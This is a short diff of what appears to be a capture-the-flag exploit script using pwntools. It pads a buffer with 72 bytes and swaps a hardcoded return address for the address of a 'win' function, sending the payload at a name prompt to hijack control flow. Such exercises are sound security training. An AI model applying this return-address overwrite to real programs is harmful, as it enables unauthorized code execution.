@@ -13,7 +13,7 @@ for i in range(72):
     payload += b"\x00"
 
 # little endian
-payload += b"\x36\x12\x40\x00\x00\x00\x00\x00"
+payload += p64(win)
 
 r.recvuntil(b"What's your name? ")
 r.sendline(payload)
